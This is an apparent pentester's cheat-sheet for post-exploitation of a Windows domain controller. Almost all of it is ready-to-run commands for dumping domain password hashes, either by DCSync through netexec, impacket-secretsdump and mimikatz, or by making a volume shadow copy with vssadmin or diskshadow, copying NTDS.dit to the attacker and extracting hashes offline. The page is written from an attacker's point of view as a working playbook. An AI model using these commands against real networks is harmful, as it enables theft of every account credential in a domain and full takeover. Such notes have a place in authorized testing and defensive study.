>Post exploit on domain controller.

```powershell
net localgroup
```

```powershell
net user <user>
```

jackpot if in `Domain Admins` group
# Automated

## `netexec`

```sh
netexec smb $target$ -u 'sysadmin' -p 'password' -M ntdsutil
```

## `impacket`

`"$domain/$user"` is the SPN (service principal name) of the `Doamin Admin` account we pwned

```sh
impacket-secretsdump -outputfile dcsync -just-dc "$domain/$user@$target"
```

## `mimikatz`

```cmd
.\mimikatz.exe

mimikatz # privilege::debug
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:domain\administrator
```

# Manual

## Creating shadow copy of C:

## `vssadmin.exe`

>It is very likely that NTDS will be stored on `C:` as that is the default location selected at install, but it is possible to change the location.
>We use VSS for this because it is designed to make copies of volumes that may be read & written to actively without needing to bring a particular application or system down

```powershell
vssadmin CREATE SHADOW /For=C:
```

note this output down: `Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\1`

## `diskshadow.exe`

```cmd
diskshadow.exe

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```

## Get `NTDS.dit` file

```powershell
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\NTDS.dit
```

>After this, transfer the file `NTDS.dit` to attacker

## Extracting hashes from NTDS.dit

> See how to get the `system` registry hive at [Dump SAM]({{< relref "07. Credential Looting/Dump SAM" >}})

```sh
impacket-secretsdump -ntds NTDS.dit -system system LOCAL
```